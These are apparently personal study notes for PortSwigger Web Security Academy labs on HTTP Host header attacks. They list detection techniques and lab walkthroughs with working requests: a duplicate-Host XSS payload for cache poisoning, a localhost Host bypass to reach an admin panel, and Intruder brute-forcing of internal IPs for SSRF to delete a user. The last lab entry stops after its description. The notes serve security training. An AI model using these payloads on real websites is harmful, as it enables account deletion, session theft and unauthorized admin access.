# HTTP Host header attacks
https://portswigger.net/web-security/host-header

# How to identify and exploit HTTP Host header vulnerabilities
https://portswigger.net/web-security/host-header/exploiting

How to identify and exploit HTTP Host header vulnerabilities
Check for flawed validation
Inject duplicate Host headers
Supply an absolute URL
Add line wrapping ( by indentation)
Inject host override headers (X-Forwarded-Host / X-Host / X-Forwarded-Server / X-HTTP-Host-Override / Forwarded)


1. <!-- Lab: Web cache poisoning via the Host header -->
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
 To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser. 

 xss shit

 1 . change original HH - observe 500 failed
 2 . add another HH and change value to test - observe reflection in response
 3 . experiment with different values until payload:

    Host: 0a18008d04cfbdb1c061c9350092009a.web-security-academy.net
    Host: blah"onerror=alert(document.cookie)//

note:
request field:
Cache-Control: max-age=0

response fields:
Cache-Control: max-age=30
Age: 28
X-Cache: hit

material:
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control


# CACHEXSSED


2. <!-- Lab: Host header authentication bypass -->
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass

To solve the lab, access the admin panel and delete Carlos's account. 

1 . request admin panel - observe 401 unauthorised:
    GET / HTTP/1.1
    Host: 0ab2006f037c2dbbc013efc9004f0026.web-security-academy.net

response:
    HTTP/1.1 401 Unauthorized

2 . change Host - experiment different values:
    127.0.0.1 - fails

payload:
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost




3. <!-- Lab: Routing-based SSRF -->
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf

require collaborator? just for first stage
skip testing via collaborator

send GET /admin /HTTP1.1 to intruder and change Host filed to 192.168.0.x - mark x with payload marker (§x§):

GET /admin HTTP/1.1
Host: 192.168.0.§0§

use intruder payload "number" and set:
from: 0
to: 255
step: 1

find the only response that is not 504 and send to repeater

send and observe we get admin panel in response with delete user interface

request in browser and send delete request - fail and research in proxy
observe host changed back to original - change to local adress and try again

# portswigger solution:

    in admin panel research delete form:
    observe method: POST
    observe path: admin/delete 
    observe required fields:
    csrf - sVn2OQMP3K1id3suCsKbb2WgwH1iA8KU
    username - 

resend message to repeater and change to craft a valid delete request:

    POST /admin/delete HTTP/1.1
    Host: 192.168.0.49
    ..

    csrf=sVn2OQMP3K1id3suCsKbb2WgwH1iA8KU&username=carlos


# DELETED



4. <!-- Lab: SSRF via flawed request parsing -->
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing

 To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos. 

require collaborator? only for verification of vulnarbility









